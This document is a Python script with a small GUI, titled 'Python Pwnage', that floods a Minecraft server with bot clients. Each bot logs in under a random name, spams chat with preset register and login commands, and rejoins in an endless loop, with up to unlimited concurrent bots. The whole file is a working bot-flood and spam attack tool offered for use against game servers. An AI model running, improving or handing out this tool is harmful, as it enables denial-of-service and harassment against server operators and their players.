import socket,time,sys,random,os
from threading import Thread
from tkinter import *
 
handshake = '\x0f\x00\x04\t127.0.0.1\xde\x02'.encode("utf-8")
user = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 0, 2, 3, 4, 5, 6, 7, 8, 9, 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
 
def getRandomChar():
        return str(user[random.randint(0, len(user)-1)])
 
def getRandomUsername():
        username = 'Pwnage_'
        for x in range(0,9):
                username = username + getRandomChar()
        return username
 
def chat(msg):
        return (chr(len(msg)+2) + '\x01' + chr(len(msg)) + msg).encode('utf-8')
 
def connect(ip, port, username, indelay, joindelay):
        global running
 
        if not running:
                return;
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s = socks.socksocket()
        #s.setproxy(socks.PROXY_TYPE_SOCKS5,"37.187.7.203")
 
        s.connect((ip, port))
        login = (chr(len(username)+2) + chr(0) + chr(len(username)) + username).encode("utf-8")
        s.sendall(handshake)
        s.sendall(login)
        print("User "+username+" connected")
        time.sleep(indelay/2)
        s.sendall(('\x02\x16' + chr(2)).encode('utf-8'))
        try:
                for x in spam:
                        if(len(x)==0): continue
                        s.sendall(chat(x))
        except socket.error:
                pass
        time.sleep(indelay/2)
        s.close()
        print("User "+username+" disconnected")
        time.sleep(joindelay)
        connect(ip, port, getRandomUsername(), indelay, joindelay)
 
if not os.path.exists('spam.txt'):
        print("spam.txt file not found, creating a new file, consider editing this file.")
        f = open("spam.txt","a")
        f.write("/register password password\n/login password\nPwnage Begins...")
        f.close()
f = open("spam.txt", "r")
read = f.read(1024)
f.close()
print("Spam file read, length: "+str(len(read)))
spam = read.split('\n')
running = False
 
def pwn(ip, port, maxplayers, joindelay, indelay, spamdelay):
        global running
        count = 0
        while running:
                count+=1
                Thread(target=connect, args=(ip, port, getRandomUsername(), indelay, joindelay)).start()
                if(count>maxplayers and maxplayers!=0):
                        break
                time.sleep(joindelay)
 
def error(error):
        lol = Tk()
        Label(lol, text=error).pack(side="top")
        Button(lol, text="Ok", command=lol.destroy).pack(side="bottom")
 
def start():
        global running
 
        if running:
                error("Already running!")
                return;
        global status
        global ip
        ipAdd = ip.get()
        split = ipAdd.split(":")
        if len(ipAdd)==0:
                error("IP field was empty!")
                return;
        status.set("Status: Checking if IP is alive...")
 
        port = 25565
        if(len(split)==2):
                port = int(split[1])
                ipAdd = split[0]
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ipAdd, port))
                s.close()
        except socket.error:
                error("IP "+ipAdd+" at port "+str(port)+" Seems to be dead!")
                status.set("Status: Idle")
                return;
        status.set("Status: Pwnage Begins...")
        print("starting")
        running = True
        global join, stay,maxpl, spamdelay
        Thread(target=pwn, args=(ipAdd, port, maxpl.get(), join.get(), stay.get(), spamdelay.get())).start()
 
def stop():
        global useproxies
        print(useproxies.get())
        global running
 
        if not running:
                error("Not running!")
                return;
        print("stopping")
        global status
        status.set("Status: Idle")
        running = False
 
def quit():
        global running
        print("Quitting...")
        if running:
                stop()
        global root
        root.destroy()
 
root = Tk()
root.geometry('220x400')
root.wm_title("Python Pwnage")
root.protocol('WM_DELETE_WINDOW', quit)
 
frame = Frame(root)
frame.pack(side="bottom")
 
status = StringVar()
status.set("Status: Idle")
Label(frame, textvariable=status).pack(side="bottom")
 
Label(frame, text="Type ip:port here").pack(side = "top")
ip = Entry(frame)
ip.pack(side="top")
Label(frame, text="Join Delay in secs").pack(side = "top")
join = Scale(frame, from_=0.2, to=15,  resolution=0.1, orient=HORIZONTAL)
join.pack()
Label(frame, text="Secs to stay in").pack(side = "top")
stay = Scale(frame, from_=0.4, to=100,  resolution=0.1, orient=HORIZONTAL)
stay.pack()
Label(frame, text="Max Players (0=infinite)").pack(side = "top")
maxpl = Scale(frame, from_=0, to=1000,  resolution=5, orient=HORIZONTAL)
maxpl.pack()
Label(frame, text="Delay between spams").pack(side = "top")
spamdelay = Scale(frame, from_=0, to=10,  resolution=0.1, orient=HORIZONTAL)
spamdelay.pack()
 
useproxies = IntVar()
 
Checkbutton(frame, text="Use Proxies [DOES NOTHING ATM]", variable=useproxies, onvalue=1, offvalue=0).pack(side = "top")
 
Button(frame, text="Start", command=start).pack(side="left",padx = 5, pady = 5)
Button(frame, text="Stop", command=stop).pack(side="left",padx = 5, pady = 5)
Button(frame, text="Quit", command=quit).pack(side="left",padx = 5, pady = 5)
 
root.mainloop()
